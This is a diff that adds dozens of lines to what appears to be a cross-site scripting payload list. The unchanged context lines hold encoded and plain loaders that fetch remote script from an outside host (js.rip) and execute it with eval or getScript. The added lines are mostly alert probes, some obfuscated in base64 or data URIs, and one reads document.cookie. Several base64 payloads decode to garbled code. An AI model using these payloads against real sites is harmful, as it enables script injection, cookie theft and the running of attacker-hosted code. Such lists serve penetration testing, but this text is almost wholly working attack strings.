@@ -1967,3 +1967,41 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip
 "><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/wyy2hglmmb&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/wyy2hglmmb");a.send();</script>
 <script>$.getScript("https://js.rip/wyy2hglmmb")</script>
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<body onload="alert('XSS')">
+<svg/onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+<object data="javascript:alert('XSS')"></object>
+<embed src="javascript:alert('XSS')"></embed>
+<video><source src="javascript:alert('XSS')"></video>
+<form action="javascript:alert('XSS')"></form>
+<a href="javascript:alert('XSS')">click</a>
+<marquee onstart="alert('XSS')">test</marquee>
+<div onmouseover="alert('XSS')">hover me</div>
+<input onfocus="alert('XSS')">
+<textarea onfocus="alert('XSS')">text</textarea>
+<select onchange="alert('XSS')"><option>test</option></select>
+<base href="javascript:alert('XSS')">
+<script>document.write('<img src=x onerror=alert("XSS")>');</script>
+<script src="data:text/javascript;base64,dmFyIGFscmVydCA9IGFscmVydCgnWEFTUycpOyBhbGVydCgpOw=="></script>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KICA8Y2lyY2xlIHJ4PSI1MCIgcnk9IjUwIiBmaWxsPSJyZWQiIC8+CiAgPHRleHQgeD0iMTEiIHk9IjE1IiBmaWxsPSJibGFnayI+QWxlcnQoIlhTUyIpPC90ZXh0Pjwvc3ZnPg==" />
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert('XSS')</script></svg>
+<iframe src="data:text/html;base64,PGJvZHkgb25sb2FkPSJhbGVydCgxKSI+PC9ib2R5Pg=="></iframe>
+<video><source src="data:text/html;base64,PHNjcmlwdCBhbGVydCgnaHRtbCcpPC9zY3JpcHQ+" type="text/html"></video>
+<iframe src="data:text/html;base64,PGJvZHkgb25sb2FkPSJhbGVydCgxKSI+PC9ib2R5Pg=="></iframe>
+<iframe src="javascript:eval(atob('YWxlcnQoIkZ1bmN0aW9uIGV4YW1wbGUiKQ=='))"></iframe>
+<svg><desc><![CDATA[<script>alert('XSS')</script>]]></desc></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[alert('XSS')]]></script></svg>
+<script src="data:text/javascript;base64,dmFyIGFscmVydCA9IGFscmVydCgxKTsgaGVscG1lbnQoIkdvb2QgQ2FsbCIpOwp2YXIgZG9jdW1lbnQ9ZG9jdW1lbnQoIkdvb2QgQ2FsbCIpOw=="></script>
+<a href="javascript:eval(atob('YWxlcnQoIkFzc2VydCBJcyBub3Qgd29ya2VkIik=')">test</a>
+<a href="javascript:eval('alert(document.cookie)')">click me</a>
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+<img src="javascript:fetch('http://example.com/').then(response => response.text()).then(text => alert(text))">
+<img src="data:image/svg+xml;utf8,<svg/onload=alert(1)>"/>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KICA8Y2lyY2xlIHJ4PSI1MCIgcnk9IjUwIiBmaWxsPSJyZWQiIC8+CiAgPHRleHQgeD0iMTEiIHk9IjE1IiBmaWxsPSJibGFnayI+QWxlcnQoIlhTUyIpPC90ZXh0Pjwvc3ZnPg=="/>
+<img src="data:image/svg+xml;utf8,<svg/onload=alert(1)></svg>"/>
+<iframe src="data:text/html;charset=utf-8,<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html;charset=utf-8,<img src=x onerror=alert(1)>"></iframe>
+<iframe src="javascript:document.write('<img src=x onerror=alert(1)>')"></iframe>
